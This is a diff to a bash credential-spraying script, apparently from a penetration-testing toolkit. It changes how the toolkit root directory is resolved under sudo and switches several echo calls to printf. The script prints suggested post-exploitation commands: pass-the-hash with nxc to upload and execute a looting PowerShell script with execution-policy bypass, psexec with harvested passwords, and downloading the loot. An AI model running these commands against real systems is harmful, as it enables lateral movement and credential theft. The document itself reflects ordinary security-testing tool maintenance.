@@ -45,7 +45,15 @@ hit_admin() { echo -e "${GREEN}${BOLD}[$(ts)] [+] ★ ADMIN HIT:${NC}${GREEN}${B
 disable_colors() { RED='' GREEN='' YELLOW='' BLUE='' CYAN='' MAGENTA='' BOLD='' NC=''; }
 [[ "${NO_COLOR:-0}" == "1" ]] || [[ ! -t 1 ]] && disable_colors
 
-TOOLKIT_ROOT="${TOOLKIT_ROOT:-${HOME}/offsec}"
+if [[ -z "${TOOLKIT_ROOT:-}" ]]; then
+    if [[ -n "${SUDO_USER:-}" ]]; then
+        _inv_home=$(getent passwd "$SUDO_USER" 2>/dev/null | cut -d: -f6)
+        TOOLKIT_ROOT="${_inv_home:-$HOME}/offsec"
+        unset _inv_home
+    else
+        TOOLKIT_ROOT="${HOME}/offsec"
+    fi
+fi
 
 creds_log() {
     local creds_file="${TOOLKIT_ROOT}/creds.txt"
@@ -490,8 +498,8 @@ generate_next_steps() {
                 echo "  ./adr.sh -d ${dom_smb} -u ${smb_u} -H :${NT_HASH} -dc ${smb_t}"
                 echo ""
                 echo "# Post-exploit collection (drop and run on target):"
-                echo "  nxc smb ${smb_t} -u ${smb_u} -H ${NT_HASH} --put-file ~/scripts/lootr.ps1 C:\\\\Windows\\\\Temp\\\\lootr.ps1"
-                echo "  nxc smb ${smb_t} -u ${smb_u} -H ${NT_HASH} -x 'powershell -ep bypass C:\\Windows\\Temp\\lootr.ps1 -OutDir C:\\Windows\\Temp\\loot'"
+                printf '  %s\n' "nxc smb ${smb_t} -u ${smb_u} -H ${NT_HASH} --put-file ~/scripts/lootr.ps1 C:\\\\Windows\\\\Temp\\\\lootr.ps1"
+                printf '  %s\n' "nxc smb ${smb_t} -u ${smb_u} -H ${NT_HASH} -x 'powershell -ep bypass C:\\Windows\\Temp\\lootr.ps1 -OutDir C:\\Windows\\Temp\\loot'"
             else
                 local q_pass; printf -v q_pass '%q' "$AUTH_PASS"
                 echo "  impacket-psexec ${smb_u}:${q_pass}@${smb_t}"
@@ -507,8 +515,8 @@ generate_next_steps() {
                 echo "  ./adr.sh -d ${dom_smb_p} -u ${smb_u} -p '${AUTH_PASS}' -dc ${smb_t}"
                 echo ""
                 echo "# Post-exploit collection:"
-                echo "  nxc smb ${smb_t} -u ${smb_u} -p ${q_pass} --put-file ~/scripts/lootr.ps1 C:\\\\Windows\\\\Temp\\\\lootr.ps1"
-                echo "  nxc smb ${smb_t} -u ${smb_u} -p ${q_pass} -x 'powershell -ep bypass C:\\Windows\\Temp\\lootr.ps1 -OutDir C:\\Windows\\Temp\\loot'"
+                printf '  %s\n' "nxc smb ${smb_t} -u ${smb_u} -p ${q_pass} --put-file ~/scripts/lootr.ps1 C:\\\\Windows\\\\Temp\\\\lootr.ps1"
+                printf '  %s\n' "nxc smb ${smb_t} -u ${smb_u} -p ${q_pass} -x 'powershell -ep bypass C:\\Windows\\Temp\\lootr.ps1 -OutDir C:\\Windows\\Temp\\loot'"
             fi
         fi
 
@@ -548,7 +556,7 @@ generate_next_steps() {
             echo "  upload ~/scripts/lootr.ps1 C:\\Windows\\Temp\\lootr.ps1"
             echo "  powershell -ep bypass C:\\Windows\\Temp\\lootr.ps1 -OutDir C:\\Windows\\Temp\\loot"
             echo "  download C:\\Windows\\Temp\\loot\\summary.txt"
-            echo "  download C:\\Windows\\Temp\\loot\\attack_commands.txt"
+            printf '  %s\n' "download C:\\Windows\\Temp\\loot\\attack_commands.txt"
         fi
 
         # WinRM valid login without explicit admin marker
@@ -756,7 +764,7 @@ OPTIONS:
   --timeout N             Per-protocol timeout seconds (default: 30)
   --from-creds            Spray all creds from $TOOLKIT_ROOT/creds.txt against
                           all targets from $TOOLKIT_ROOT/recon/ (SMB/WinRM/SSH/RDP)
-  --outdir DIR            Output directory (default: ./spray/<timestamp>/)
+  --outdir DIR            Output directory (default: $TOOLKIT_ROOT/spray/<timestamp>/)
   -h, --help              This help
 
 EXAMPLES:
@@ -1231,6 +1239,7 @@ main() {
 }
 
 if [[ "${OffSec_LIB_ONLY:-false}" == "true" ]]; then
+    # shellcheck disable=SC2317
     return 0 2>/dev/null || exit 0
 fi
 
